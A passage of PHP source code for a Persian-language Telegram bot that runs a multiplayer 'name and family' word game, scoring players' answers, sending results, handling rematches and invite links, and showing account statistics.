$juser["userfild"]["coin"]="$coinplus";
$juser = json_encode($juser,true);
file_put_contents("data/$from_id.json",$juser);
}
}
else
{
@$juser = json_decode(file_get_contents("data/$from_id.json"),true);
$juser["userfild"]["coinlist"][$z]="0";
$juser = json_encode($juser,true);
file_put_contents("data/$from_id.json",$juser);
}
if(in_array($answerrival[$z], $wordlist["wordlist"]["$tab[$z]"]["$harf"])){
if($answerrival[$z] != $answer[$z]){
$inuser = json_decode(file_get_contents("data/$rival.json"),true);
$coin = $inuser["userfild"]["coin"];
$coingame = $inuser["userfild"]["coingame"];
$coinplus = $coin + 10 ;
$coingameplus = $coingame + 10;
$inuser["userfild"]["coinlist"][$z]="10";
$inuser["userfild"]["coingame"]="$coingameplus";
$inuser["userfild"]["coin"]="$coinplus";
$inuser = json_encode($inuser,true);
file_put_contents("data/$rival.json",$inuser);
}
else
{
$inuser = json_decode(file_get_contents("data/$rival.json"),true);
$coin = $inuser["userfild"]["coin"];
$coingame = $inuser["userfild"]["coingame"];
$coinplus = $coin + 5 ;
$coingameplus = $coingame + 5;
$inuser["userfild"]["coinlist"][$z]="5";
$inuser["userfild"]["coingame"]="$coingameplus";
$inuser["userfild"]["coin"]="$coinplus";
$inuser = json_encode($inuser,true);
file_put_contents("data/$rival.json",$inuser);
}
}
else
{
$inuser = json_decode(file_get_contents("data/$rival.json"),true);
$inuser["userfild"]["coinlist"][$z]="0";
$inuser = json_encode($inuser,true);
file_put_contents("data/$rival.json",$inuser);
}
@$juser = json_decode(file_get_contents("data/$from_id.json"),true);
$coinlist = $juser["userfild"]["coinlist"];
$inuser = json_decode(file_get_contents("data/$rival.json"),true);
$coinlistrival = $inuser["userfild"]["coinlist"];
$resultgamer1 = $resultgamer1."$answer[$z] $coinlist[$z]"." | ";
$resultgamer2 = $resultgamer2."$answerrival[$z] $coinlistrival[$z]"." | ";
}
@$juser = json_decode(file_get_contents("data/$from_id.json"),true);
$rival = $juser["userfild"]["rival"];
$coingame = $juser["userfild"]["coingame"];
$coingamerival = $inuser["userfild"]["coingame"];
$result = array("$coingame","$coingamerival");
$gamer = array("$first_name","$name");
$gamerid = array("$from_id","$rival");
$winer = max($result);
$loser = min($result);
$searchwiner = array_search($winer,$result);
$searchloser = array_search($loser,$result);
if($loser != $winer){
Bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"🎮 بازی توسط $first_name استپ شد !

🎳 ننیجه بازی :
	
🥇 $gamer[$searchwiner] با $winer امتیاز
🥈 $gamer[$searchloser] با $loser امتیاز
	
🎲 جزئیات بازی :

🔆 $first_name  
🎰 $resultgamer1 
🎈 جمع امتیازات : $coingame
➖➖➖
🔆 $name 
🎰 $resultgamer2 
🎈 جمع امتیازات : $coingamerival

🗣 کلمه بدون امتیاز وجود داشت ؟ 
با دستور /addword اضافه اش کن تا برای دور های بعدی و دیگران هم این کلمه امتیاز دار بشه و توهم به خاطر اضافه کردنش دو امتیاز مثبت بگیری 😝",
    'reply_markup'=>json_encode([
            	'keyboard'=>[
				[
				['text'=>"🔙 برگشت"],['text'=>"🔄 بازی دوباره"]
				],
								[
				['text'=>"🎰 حریف دیگر"]
				],
 	],
            	'resize_keyboard'=>true
       		])
	  	]);
		Bot('sendmessage',[
	'chat_id'=>$rival,
	'text'=>"🎮 بازی توسط $first_name استپ شد !

🎳 ننیجه بازی :
	
🥇 $gamer[$searchwiner] با $winer امتیاز
🥈 $gamer[$searchloser] با $loser امتیاز
	
🎲 جزئیات بازی :

🔆 $first_name  
🎰 $resultgamer1 
🎈 جمع امتیازات : $coingame
➖➖➖
🔆 $name 
🎰 $resultgamer2 
🎈 جمع امتیازات : $coingamerival

🗣 کلمه بدون امتیاز وجود داشت ؟ 
با دستور /addword اضافه اش کن تا برای دور های بعدی و دیگران هم این کلمه امتیاز دار بشه و توهم به خاطر اضافه کردنش دو امتیاز مثبت بگیری 😝",
    'reply_markup'=>json_encode([
            	'keyboard'=>[
				[
				['text'=>"🔙 برگشت"],['text'=>"🔄 بازی دوباره"]
				],
								[
				['text'=>"🎰 حریف دیگر"]
				],
 	],
            	'resize_keyboard'=>true
       		])
	  	]);
}
else
{
Bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"🎮 بازی توسط $first_name استپ شد !

🎳 ننیجه بازی :
	
🏳 بازی مساوی شد ! هر دو شرکت کننده در امتیاز $winer برار هستند
	
🎲 جزئیات بازی :

🔆 $first_name  
🎰 $resultgamer1 
🎈 جمع امتیازات : $coingame
➖➖➖
🔆 $name 
🎰 $resultgamer2 
🎈 جمع امتیازات : $coingamerival

🗣 کلمه بدون امتیاز وجود داشت ؟ 
با دستور /addword اضافه اش کن تا برای دور های بعدی و دیگران هم این کلمه امتیاز دار بشه و توهم به خاطر اضافه کردنش دو امتیاز مثبت بگیری 😝",
    'reply_markup'=>json_encode([
            	'keyboard'=>[
				[
				['text'=>"🔙 برگشت"],['text'=>"🔄 بازی دوباره"]
				],
								[
				['text'=>"🎰 حریف دیگر"]
				],
 	],
            	'resize_keyboard'=>true
       		])
	  	]);
		Bot('sendmessage',[
	'chat_id'=>$rival,
	'text'=>"🎮 بازی توسط $first_name استپ شد !

🎳 ننیجه بازی :
	
🏳 بازی مساوی شد ! هر دو شرکت کننده در امتیاز $winer برار هستند
	
🎲 جزئیات بازی :

🔆 $first_name  
🎰 $resultgamer1 
🎈 جمع امتیازات : $coingame
➖➖➖
🔆 $name 
🎰 $resultgamer2 
🎈 جمع امتیازات : $coingamerival

🗣 کلمه بدون امتیاز وجود داشت ؟ 
با دستور /addword اضافه اش کن تا برای دور های بعدی و دیگران هم این کلمه امتیاز دار بشه و توهم به خاطر اضافه کردنش دو امتیاز مثبت بگیری 😝",
    'reply_markup'=>json_encode([
            	'keyboard'=>[
				[
				['text'=>"🔙 برگشت"],['text'=>"🔄 بازی دوباره"]
				],
								[
				['text'=>"🎰 حریف دیگر"]
				],
 	],
            	'resize_keyboard'=>true
       		])
	  	]);
		
}
if($from_id == $gamerid[$searchwiner]){
$win = $juser["userfild"]["win"];
$pluswin = $win + 1 ;
$juser["userfild"]["win"]="$pluswin";
$winrival = $inuser["userfild"]["lose"];
$pluswinrival = $winrival + 1 ;
$inuser["userfild"]["lose"]="$pluswinrival";
}
else
{
$win = $juser["userfild"]["lose"];
$pluswin = $win + 1 ;
$juser["userfild"]["lose"]="$pluswin";
$winrival = $inuser["userfild"]["win"];
$pluswinrival = $winrival + 1 ;
$inuser["userfild"]["win"]="$pluswinrival";
}
unset($juser["userfild"]["answer"]);
unset($juser["userfild"]["coinlist"]);
$juser["userfild"]["coingame"]="0";
$juser = json_encode($juser,true);
file_put_contents("data/$from_id.json",$juser);
unset($inuser["userfild"]["answer"]);
unset($inuser["userfild"]["coinlist"]);
$inuser["userfild"]["coingame"]="0";
$inuser = json_encode($inuser,true);
file_put_contents("data/$rival.json",$inuser);
}
elseif($textmassage=="🔄 بازی دوباره"){	
$rival = $juser["userfild"]["rival"];
$inuser = json_decode(file_get_contents("data/$rival.json"),true);
$step = $inuser["userfild"]["step"];
if($step == "instop"){
Bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"🌟 درخواست بازی برای حریف شما ارسال شد
	
📍 درصورت تایید حریفت دور جدید شروع میشه",
	  	]); 
Bot('sendmessage',[
	'chat_id'=>$rival,
	'text'=>"📍 درخواست بازی جدید از طرف $first_name
	
📌 برای پاسخ دادن از دکمه های زیر استفاده کنید",
    'reply_markup'=>json_encode([
            	'keyboard'=>[
				[
				['text'=>"🎲 بازی نمیکنم"],['text'=>"🎮 بازی میکنم"]
				],
 	],
            	'resize_keyboard'=>true
       		])
	  	]); 
}
else
{
Bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"📍 حریف شما از ادامه بازی با شما انصراف داده است",
	    'reply_markup'=>json_encode([
            	'keyboard'=>[
								[
				['text'=>"🎮 بازی شانسی[دو نفره]"]
				],
				[
				['text'=>"🏵 حساب کابری"],['text'=>"🗣 کلمه جدید"]
				],
                 [
                   ['text'=>"🚦 راهنما"],['text'=>"🏆برترین ها | رتبه من"]
                ],
									[
				['text'=>"🕹 بازی دوستانه [چند نفره]"]
				],
 	],
            	'resize_keyboard'=>true
       		])
	  	]);
}
}
//ارتقا دهنده دیباگ کننده سورس @DevOscar
//اولین چنل اوپن کننده @Virtualservices_3
//بی ناموسی منبع پاک کنی با افتخار به سعید افکونی
elseif($textmassage=="🎮 بازی میکنم"){	
$rival = $juser["userfild"]["rival"];
$horof = array("ا","ب","پ","ت","ج","چ","خ","د","ر","ز","س","ش","ع","ف","ق","ک","گ","ل","م","ن","ه","ی");
$getrandomletters = $horof[rand(0,count($horof)-1)];
Bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"🎲 بازی مجدد از طرف هر دو طرف قبول شد",
	 'reply_markup'=>json_encode([
            	'keyboard'=>[
								[
				['text'=>"🔙 انصراف از بازی"]
				],
 	],
            	'resize_keyboard'=>true
       		])
	  	]);
Bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"🎮 بازی اغاز شد با حرف `$getrandomletters`
	
اسم با حرف `$getrandomletters` بگو",
	'parse_mode'=>'MarkDown',
		'reply_markup'=>json_encode([
    'inline_keyboard'=>[
	[
	['text'=>"🙄 نمیدونم",'callback_data'=>'dontknow']
	],
              ]
        ])
	  	]);
		Bot('sendmessage',[
	'chat_id'=>$rival,
	'text'=>"🎲 بازی مجدد از طرف هر دو طرف قبول شد",
	 'reply_markup'=>json_encode([
            	'keyboard'=>[
								[
				['text'=>"🔙 انصراف از بازی"]
				],
 	],
            	'resize_keyboard'=>true
       		])
	  	]);
		Bot('sendmessage',[
	'chat_id'=>$rival,
	'text'=>"🎮 بازی اغاز شد با حرف `$getrandomletters`
	
اسم با حرف `$getrandomletters` بگو",
	'parse_mode'=>'MarkDown',
		'reply_markup'=>json_encode([
    'inline_keyboard'=>[
	[
	['text'=>"🙄 نمیدونم",'callback_data'=>'dontknow']
	],
              ]
        ])
	  	]);
$numbergame = $juser["userfild"]["numbergame"];
$plusnumbergame = $numbergame + 1 ;
$juser["userfild"]["step"]="gameplay";
$juser["userfild"]["get"]="0";
$juser["userfild"]["harf"]="$getrandomletters";
$juser["userfild"]["numbergame"]="$plusnumbergame";
$juser = json_encode($juser,true);
file_put_contents("data/$from_id.json",$juser);
$inuser = json_decode(file_get_contents("data/$rival.json"),true);
$numbergame = $inuser["userfild"]["numbergame"];
$plusnumbergame = $numbergame + 1 ;
$inuser["userfild"]["step"]="gameplay";
$inuser["userfild"]["get"]="0";
$inuser["userfild"]["harf"]="$getrandomletters";
$inuser["userfild"]["numbergame"]="$plusnumbergame";
$inuser = json_encode($inuser,true);
file_put_contents("data/$rival.json",$inuser);
}
elseif($textmassage=="🎲 بازی نمیکنم"){	
$rival = $juser["userfild"]["rival"];
Bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"📍 درخواست با موفقیت رد شد
	
🌟 به منوی اصلی ربات خوش امدید",
    'reply_markup'=>json_encode([
            	'keyboard'=>[
								[
				['text'=>"🎮 بازی شانسی[دو نفره]"]
				],
				[
				['text'=>"🏵 حساب کابری"],['text'=>"🗣 کلمه جدید"]
				],
                 [
                   ['text'=>"🚦 راهنما"],['text'=>"🏆برترین ها | رتبه من"]
                ],
									[
				['text'=>"🕹 بازی دوستانه [چند نفره]"]
				],
 	],
            	'resize_keyboard'=>true
       		])
	  	]); 
Bot('sendmessage',[
	'chat_id'=>$rival,
	'text'=>"📍 درخواست بازی شما از طرف $first_name رد شد
	
🌟 به منوی اصلی ربات خوش امدید",
    'reply_markup'=>json_encode([
            	'keyboard'=>[
								[
				['text'=>"🎮 بازی شانسی[دو نفره]"]
				],
				[
				['text'=>"🏵 حساب کابری"],['text'=>"🗣 کلمه جدید"]
				],
                 [
                   ['text'=>"🚦 راهنما"],['text'=>"🏆برترین ها | رتبه من"]
                ],
									[
				['text'=>"🕹 بازی دوستانه [چند نفره]"]
				],
 	],
            	'resize_keyboard'=>true
       		])
	  	]); 
$juser["userfild"]["step"]="none";
$juser = json_encode($juser,true);
file_put_contents("data/$from_id.json",$juser);
$inuser = json_decode(file_get_contents("data/$rival.json"),true);
$inuser["userfild"]["step"]="none";
$inuser = json_encode($inuser,true);
file_put_contents("data/$rival.json",$inuser);
}
elseif($textmassage=="استُپ 🎲"){	
Bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"🎮 بازی استپ شد منتظر بمانید ربات در حال پردازش امیتازات است ...",
	  	]);
$tab = array("اسم","فامیل","شهر","کشور","میوه","حیوان","غذا","رنگ","ماشین","گل","اشیا");
$harf = $juser["userfild"]["harf"];
$ingame = $juser["userfild"]["ingame"];
$gamer = $gamerlist["$ingame"]["gamer"];
$allword = array();
$resultall = array();
$allcoingame = array();
$allcoingame2 = array();
if($gamer[0] == true){
$inuser = json_decode(file_get_contents("data/$gamer[0].json"),true);
$answer = $inuser["userfild"]["answer"];
for($z = 0;$z <= count($tab) -1;$z++){
if(in_array($answer[$z], $wordlist["wordlist"]["$tab[$z]"]["$harf"])){
if(!in_array($answer[$z], $allword)) {
$inuser = json_decode(file_get_contents("data/$gamer[0].json"),true);
$coin = $inuser["userfild"]["coin"];
$coingame = $inuser["userfild"]["coingame"];
$coinplus = $coin + 10 ;
$coingameplus = $coingame + 10 ;
$inuser["userfild"]["coinlist"][$z]="10";
$inuser["userfild"]["coingame"]="$coingameplus";
$inuser["userfild"]["coin"]="$coinplus";
$inuser = json_encode($inuser,true);
file_put_contents("data/$gamer[0].json",$inuser);
$allword[]=$answer[$z];
}
else
{
$inuser = json_decode(file_get_contents("data/$gamer[0].json"),true);
$coin = $inuser["userfild"]["coin"];
$coingame = $inuser["userfild"]["coingame"];
$coinplus = $coin + 5 ;
$coingameplus = $coingame + 5;
$inuser["userfild"]["coinlist"][$z]="5";
$inuser["userfild"]["coingame"]="$coingameplus";
$inuser["userfild"]["coin"]="$coinplus";
$inuser = json_encode($inuser,true);
file_put_contents("data/$gamer[0].json",$inuser);
}
}
//ارتقا دهنده دیباگ کننده سورس @DevOscar
//اولین چنل اوپن کننده @Virtualservices_3
//بی ناموسی منبع پاک کنی با افتخار به سعید افکونی
else
{
$inuser = json_decode(file_get_contents("data/$gamer[0].json"),true);
$inuser["userfild"]["coinlist"][$z]="0";
$inuser = json_encode($inuser,true);
file_put_contents("data/$gamer[0].json",$inuser);
}
$inuser = json_decode(file_get_contents("data/$gamer[0].json"),true);
$answer = $inuser["userfild"]["answer"];
$coinlist = $inuser["userfild"]["coinlist"];
$resultgamer0 = $resultgamer0."$answer[$z] $coinlist[$z]"." | ";
}
$resultall[]=$resultgamer0;
$coingame = $inuser["userfild"]["coingame"];
$allcoingame[]=$coingame;
$allcoingame2[]=$coingame;
}
if($gamer[1] == true){
$inuser = json_decode(file_get_contents("data/$gamer[1].json"),true);
$answer = $inuser["userfild"]["answer"];
for($z = 0;$z <= count($tab) -1;$z++){
if(in_array($answer[$z], $wordlist["wordlist"]["$tab[$z]"]["$harf"])){
if(!in_array($answer[$z], $allword)) {
$inuser = json_decode(file_get_contents("data/$gamer[1].json"),true);
$coin = $inuser["userfild"]["coin"];
$coingame = $inuser["userfild"]["coingame"];
$coinplus = $coin + 10 ;
$coingameplus = $coingame + 10 ;
$inuser["userfild"]["coinlist"][$z]="10";
$inuser["userfild"]["coingame"]="$coingameplus";
$inuser["userfild"]["coin"]="$coinplus";
$inuser = json_encode($inuser,true);
file_put_contents("data/$gamer[1].json",$inuser);
$allword[]=$answer[$z];
}
else
{
$inuser = json_decode(file_get_contents("data/$gamer[1].json"),true);
$coin = $inuser["userfild"]["coin"];
$coingame = $inuser["userfild"]["coingame"];
$coinplus = $coin + 5 ;
$coingameplus = $coingame + 5;
$inuser["userfild"]["coinlist"][$z]="5";
$inuser["userfild"]["coingame"]="$coingameplus";
$inuser["userfild"]["coin"]="$coinplus";
$inuser = json_encode($inuser,true);
file_put_contents("data/$gamer[1].json",$inuser);
}
}
else
{
$inuser = json_decode(file_get_contents("data/$gamer[1].json"),true);
$inuser["userfild"]["coinlist"][$z]="0";
$inuser = json_encode($inuser,true);
file_put_contents("data/$gamer[1].json",$inuser);
}
$inuser = json_decode(file_get_contents("data/$gamer[1].json"),true);
$answer = $inuser["userfild"]["answer"];
$coinlist = $inuser["userfild"]["coinlist"];
$resultgamer1 = $resultgamer1."$answer[$z] $coinlist[$z]"." | ";
}
$resultall[]=$resultgamer1;
$coingame = $inuser["userfild"]["coingame"];
$allcoingame[]=$coingame;
$allcoingame2[]=$coingame;
}
if($gamer[2] == true){
$inuser = json_decode(file_get_contents("data/$gamer[2].json"),true);
$answer = $inuser["userfild"]["answer"];
for($z = 0;$z <= count($tab) -1;$z++){
if(in_array($answer[$z], $wordlist["wordlist"]["$tab[$z]"]["$harf"])){
if(!in_array($answer[$z], $allword)) {
$inuser = json_decode(file_get_contents("data/$gamer[2].json"),true);
$coin = $inuser["userfild"]["coin"];
$coingame = $inuser["userfild"]["coingame"];
$coinplus = $coin + 10 ;
$coingameplus = $coingame + 10 ;
$inuser["userfild"]["coinlist"][$z]="10";
$inuser["userfild"]["coingame"]="$coingameplus";
$inuser["userfild"]["coin"]="$coinplus";
$inuser = json_encode($inuser,true);
file_put_contents("data/$gamer[2].json",$inuser);
$allword[]=$answer[$z];
}
//ارتقا دهنده دیباگ کننده سورس @DevOscar
//اولین چنل اوپن کننده @Virtualservices_3
//بی ناموسی منبع پاک کنی با افتخار به سعید افکونی
else
{
$inuser = json_decode(file_get_contents("data/$gamer[2].json"),true);
$coin = $inuser["userfild"]["coin"];
$coingame = $inuser["userfild"]["coingame"];
$coinplus = $coin + 5 ;
$coingameplus = $coingame + 5;
$inuser["userfild"]["coinlist"][$z]="5";
$inuser["userfild"]["coingame"]="$coingameplus";
$inuser["userfild"]["coin"]="$coinplus";
$inuser = json_encode($inuser,true);
file_put_contents("data/$gamer[2].json",$inuser);
}
}
else
{
$inuser = json_decode(file_get_contents("data/$gamer[2].json"),true);
$inuser["userfild"]["coinlist"][$z]="0";
$inuser = json_encode($inuser,true);
file_put_contents("data/$gamer[2].json",$inuser);
}
$inuser = json_decode(file_get_contents("data/$gamer[2].json"),true);
$answer = $inuser["userfild"]["answer"];
$coinlist = $inuser["userfild"]["coinlist"];
$resultgamer2 = $resultgamer2."$answer[$z] $coinlist[$z]"." | ";
}
$resultall[]=$resultgamer2;
$coingame = $inuser["userfild"]["coingame"];
$allcoingame[]=$coingame;
$allcoingame2[]=$coingame;
}
if($gamer[3] == true){
$inuser = json_decode(file_get_contents("data/$gamer[3].json"),true);
$answer = $inuser["userfild"]["answer"];
for($z = 0;$z <= count($tab) -1;$z++){
if(in_array($answer[$z], $wordlist["wordlist"]["$tab[$z]"]["$harf"])){
if(!in_array($answer[$z], $allword)) {
$inuser = json_decode(file_get_contents("data/$gamer[3].json"),true);
$coin = $inuser["userfild"]["coin"];
$coingame = $inuser["userfild"]["coingame"];
$coinplus = $coin + 10 ;
$coingameplus = $coingame + 10 ;
$inuser["userfild"]["coinlist"][$z]="10";
$inuser["userfild"]["coingame"]="$coingameplus";
$inuser["userfild"]["coin"]="$coinplus";
$inuser = json_encode($inuser,true);
file_put_contents("data/$gamer[3].json",$inuser);
$allword[]=$answer[$z];
}
else
{
$inuser = json_decode(file_get_contents("data/$gamer[3].json"),true);
$coin = $inuser["userfild"]["coin"];
$coingame = $inuser["userfild"]["coingame"];
$coinplus = $coin + 5 ;
$coingameplus = $coingame + 5;
$inuser["userfild"]["coinlist"][$z]="5";
$inuser["userfild"]["coingame"]="$coingameplus";
$inuser["userfild"]["coin"]="$coinplus";
$inuser = json_encode($inuser,true);
file_put_contents("data/$gamer[3].json",$inuser);
}
}
else
{
$inuser = json_decode(file_get_contents("data/$gamer[3].json"),true);
$inuser["userfild"]["coinlist"][$z]="0";
$inuser = json_encode($inuser,true);
file_put_contents("data/$gamer[3].json",$inuser);
}
$inuser = json_decode(file_get_contents("data/$gamer[3].json"),true);
$answer = $inuser["userfild"]["answer"];
$coinlist = $inuser["userfild"]["coinlist"];
$resultgamer3 = $resultgamer3."$answer[$z] $coinlist[$z]"." | ";
}
$resultall[]=$resultgamer3;
$coingame = $inuser["userfild"]["coingame"];
$allcoingame[]=$coingame;
$allcoingame2[]=$coingame;
}
if($gamer[4] == true){
$inuser = json_decode(file_get_contents("data/$gamer[4].json"),true);
$answer = $inuser["userfild"]["answer"];
for($z = 0;$z <= count($tab) -1;$z++){
if(in_array($answer[$z], $wordlist["wordlist"]["$tab[$z]"]["$harf"])){
if(!in_array($answer[$z], $allword)) {
$inuser = json_decode(file_get_contents("data/$gamer[4].json"),true);
$coin = $inuser["userfild"]["coin"];
$coingame = $inuser["userfild"]["coingame"];
$coinplus = $coin + 10 ;
$coingameplus = $coingame + 10 ;
$inuser["userfild"]["coinlist"][$z]="10";
$inuser["userfild"]["coingame"]="$coingameplus";
$inuser["userfild"]["coin"]="$coinplus";
$inuser = json_encode($inuser,true);
file_put_contents("data/$gamer[4].json",$inuser);
$allword[]=$answer[$z];
}
else
{
$inuser = json_decode(file_get_contents("data/$gamer[4].json"),true);
$coin = $inuser["userfild"]["coin"];
$coingame = $inuser["userfild"]["coingame"];
$coinplus = $coin + 5 ;
$coingameplus = $coingame + 5;
$inuser["userfild"]["coinlist"][$z]="5";
$inuser["userfild"]["coingame"]="$coingameplus";
$inuser["userfild"]["coin"]="$coinplus";
$inuser = json_encode($inuser,true);
file_put_contents("data/$gamer[4].json",$inuser);
}
}
//ارتقا دهنده دیباگ کننده سورس @DevOscar
//اولین چنل اوپن کننده @Virtualservices_3
//بی ناموسی منبع پاک کنی با افتخار به سعید افکونی
else
{
$inuser = json_decode(file_get_contents("data/$gamer[4].json"),true);
$inuser["userfild"]["coinlist"][$z]="0";
$inuser = json_encode($inuser,true);
file_put_contents("data/$gamer[4].json",$inuser);
}
$inuser = json_decode(file_get_contents("data/$gamer[4].json"),true);
$answer = $inuser["userfild"]["answer"];
$coinlist = $inuser["userfild"]["coinlist"];
$resultgamer4 = $resultgamer4."$answer[$z] $coinlist[$z]"." | ";
}
$resultall[]=$resultgamer4;
$coingame = $inuser["userfild"]["coingame"];
$allcoingame[]=$coingame;
$allcoingame2[]=$coingame;
}
if($gamer[5] == true){
$inuser = json_decode(file_get_contents("data/$gamer[5].json"),true);
$answer = $inuser["userfild"]["answer"];
for($z = 0;$z <= count($tab) -1;$z++){
if(in_array($answer[$z], $wordlist["wordlist"]["$tab[$z]"]["$harf"])){
if(!in_array($answer[$z], $allword)) {
$inuser = json_decode(file_get_contents("data/$gamer[5].json"),true);
$coin = $inuser["userfild"]["coin"];
$coingame = $inuser["userfild"]["coingame"];
$coinplus = $coin + 10 ;
$coingameplus = $coingame + 10 ;
$inuser["userfild"]["coinlist"][$z]="10";
$inuser["userfild"]["coingame"]="$coingameplus";
$inuser["userfild"]["coin"]="$coinplus";
$inuser = json_encode($inuser,true);
file_put_contents("data/$gamer[5].json",$inuser);
$allword[]=$answer[$z];
}
else
{
$inuser = json_decode(file_get_contents("data/$gamer[5].json"),true);
$coin = $inuser["userfild"]["coin"];
$coingame = $inuser["userfild"]["coingame"];
$coinplus = $coin + 5 ;
$coingameplus = $coingame + 5;
$inuser["userfild"]["coinlist"][$z]="5";
$inuser["userfild"]["coingame"]="$coingameplus";
$inuser["userfild"]["coin"]="$coinplus";
$inuser = json_encode($inuser,true);
file_put_contents("data/$gamer[5].json",$inuser);
}
}
else
{
$inuser = json_decode(file_get_contents("data/$gamer[5].json"),true);
$inuser["userfild"]["coinlist"][$z]="0";
$inuser = json_encode($inuser,true);
file_put_contents("data/$gamer[5].json",$inuser);
}
$inuser = json_decode(file_get_contents("data/$gamer[5].json"),true);
$answer = $inuser["userfild"]["answer"];
$coinlist = $inuser["userfild"]["coinlist"];
$resultgamer5 = $resultgamer5."$answer[$z] $coinlist[$z]"." | ";
}
$resultall[]=$resultgamer5;
$coingame = $inuser["userfild"]["coingame"];
$allcoingame[]=$coingame;
$allcoingame2[]=$coingame;
}
$allname = array();
$stat0 = json_decode(file_get_contents("https://api.telegram.org/bot$token/getChatMember?chat_id=$gamer[0]&user_id=".$gamer[0]));
$name0 = $stat0->result->user->first_name;
$allname[]=$name0;
$stat1 = json_decode(file_get_contents("https://api.telegram.org/bot$token/getChatMember?chat_id=$gamer[1]&user_id=".$gamer[1]));
$name1 = $stat1->result->user->first_name;
$allname[]=$name1;
$stat2 = json_decode(file_get_contents("https://api.telegram.org/bot$token/getChatMember?chat_id=$gamer[2]&user_id=".$gamer[2]));
$name2 = $stat2->result->user->first_name;
$allname[]=$name2;
$stat3 = json_decode(file_get_contents("https://api.telegram.org/bot$token/getChatMember?chat_id=$gamer[3]&user_id=".$gamer[3]));
$name3 = $stat3->result->user->first_name;
$allname[]=$name3;
$stat4 = json_decode(file_get_contents("https://api.telegram.org/bot$token/getChatMember?chat_id=$gamer[4]&user_id=".$gamer[4]));
$name4 = $stat4->result->user->first_name;
$allname[]=$name4;
$stat5 = json_decode(file_get_contents("https://api.telegram.org/bot$token/getChatMember?chat_id=$gamer[5]&user_id=".$gamer[5]));
$name5 = $stat5->result->user->first_name;
$allname[]=$name5;
for($z = 0;$z <= count($gamer) -1;$z++){
$allgamer = $allgamer."🔆 $allname[$z]\n🎰 $resultall[$z]\n🎈 جمع امتیازات : $allcoingame[$z]"."\n➖➖➖\n";
}
rsort($allcoingame);
for($z = 0;$z <= count($gamer);$z++){
if(is_numeric($allcoingame[$z])){
$gets = array_search($allcoingame[$z],$allcoingame2);
$zplus = $z + 1 ;
$top = $top."$zplus - $allname[$gets] با $allcoingame[$z] امتیاز"."\n";
unset($allcoingame["$z"]);
unset($allcoingame2["$z"]);
}
}
for($z = 0;$z <= count($gamer) -1;$z++){
Bot('sendmessage',[
	'chat_id'=>$gamer[$z],
	'text'=>"🎮 بازی توسط $first_name استپ شد !
	
🎳 نتیجه بازی :

$top
	
🎲 جزئیات بازی :

$allgamer

🌟 درصورتی که میخواهید در دوره بعدی بازی باشید منتظر بمانید تا سازنده بازی دوره جدید را شروع کند

🗣 کلمه بدون امتیاز وجود داشت ؟ 
با دستور /addword اضافه اش کن تا برای دور های بعدی و دیگران هم این کلمه امتیاز دار بشه و توهم به خاطر اضافه کردنش دو امتیاز مثبت بگیری 😝",
    'reply_markup'=>json_encode([
            	'keyboard'=>[
								[
				['text'=>"انصراف از بازی 🔙"]
				],
 	],
            	'resize_keyboard'=>true
       		])
	  	]);
$inuser = json_decode(file_get_contents("data/$gamer[$z].json"),true);
unset($inuser["userfild"]["answer"]);
unset($inuser["userfild"]["coinlist"]);
$inuser["userfild"]["coingame"]="0";
$inuser["userfild"]["get"]="0";
$inuser["userfild"]["step"]="none";
$inuser = json_encode($inuser,true);
file_put_contents("data/$gamer[$z].json",$inuser);
}
Bot('sendmessage',[
	'chat_id'=>$gamer[0],
	'text'=>"🎮 ایا میخواهید دوره جدید بازی رو اغاز کنید ؟",
	  'reply_markup'=>json_encode([
            	'keyboard'=>[
								[
				['text'=>"🔙 انصراف"],['text'=>"🎳 بازی دوباره"]
				],
										[
				['text'=>"🌟 لینک بازی"]
				],
 	],
            	'resize_keyboard'=>true
       		])
	  	]);
$aval = array_search($allcoingame[0],$allcoingame2);
$inuser = json_decode(file_get_contents("data/$gamer[$aval].json"),true);
$win = $inuser["userfild"]["win"];
$pluswin = $win + 1 ;
$inuser["userfild"]["win"]="$pluswin";
$inuser = json_encode($inuser,true);
file_put_contents("data/$gamer[$aval].json",$inuser);
$gamerlist["$from_id"]["step"]="waitgamer";
$gamerlist = json_encode($gamerlist,true);
file_put_contents("data/gamerlist.json",$gamerlist);
}
elseif($textmassage=="🌟 لینک بازی"){	
			Bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"🎮 اسم و فامیل چند نفره بازی کن !
	
📍  با استفاده از دکمه زیر لینک دعوت به بازی رو برای دوستات ارسال کن",
 'reply_markup'=>json_encode([
    'inline_keyboard'=>[
	              [
              ['text'=>"🎮 ارسال بازی",'switch_inline_query'=>"play"]
              ] 
              ],
        ])
    		]);
$id = base64_encode($from_id);
				Bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"📍 دوس داری اسم فامیل بازی کنی ؟

🎮 من بازی رو ساختم بزن رو لینک دعوت و بیا تو بازی تا باهم اسم فامیل بازی کنیم ببینم کی بازیش بهتره

🔗 لینک بازی :
telegram.me/$usernamebot?start=$id",
    		]);
}
elseif($textmassage=="🏵 حساب کابری"){	
if($tch == 'member' or $tch == 'creator' or $tch == 'administrator'){
$coin = $juser["userfild"]["coin"];
$win = $juser["userfild"]["win"];
$lose = $juser["userfild"]["lose"];
$numbergame = $juser["userfild"]["numbergame"];
$percentage =  $win * 100 ;
$get = $percentage / $numbergame ; 
$gets = str_replace("NAN","هنوز بازی انجام نشده !",$get);
$floor = "%".floor($gets);
Bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"🎫 حساب کاربری شما در ربات :
	
🏆 تعداد بردها : $win
🎭 تعداد باخت ها : $lose
🏵 امتیاز شما : $coin
🎮 تعداد بازی ها : $numbergame
🎲 درصد پیروزی : $floor
📍 ایدی شما : $from_id",
	  	]); 
}
else
{
				Bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"🍃  برای استفاده از این ربات لازم است ابتدا وارد کانال زیر شوید 

@$channel @$channel  📣
@$channel @$channel  📣

☑️ بعد از عضویت در کانال میتوانید از دکمه ها استفاده کنید",
'reply_markup'=>json_encode([
    'inline_keyboard'=>[
	[
	['text'=>"📍 عضویت در کانال",'url'=>"https://t.me/$channel"]
	],
		[
